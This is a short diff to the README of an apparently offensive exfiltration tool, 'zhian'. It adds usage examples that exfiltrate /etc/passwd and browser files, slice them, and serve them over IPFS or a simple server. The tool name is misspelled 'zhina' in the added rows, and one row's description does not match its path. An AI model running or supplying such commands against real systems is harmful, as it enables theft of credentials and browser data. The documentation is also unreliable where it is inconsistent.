@@ -66,7 +66,10 @@ When zhian runs it checks the current directory for a `config.yaml`, if you wish
 ##  Example Usage
 | Command | Details |
 |:--|:--|
-| `zhian --do encode64,encodedForTest --path /etc/passwd` | Exfiltrate password file |
+| `zhian --do encode64 --path /etc/passwd` | Exfiltrate password file |
+| `zhina --path browser --slice slice1M --serve ipfs` | Exfiltrate Browser Files with 1M slice and serve on ipfs |
+| `zhina --path /etc/passwd --slice slice1M --serve simple` | Exfiltrate Browser Files with 1M slice and serve on simple |
+
 
 
 
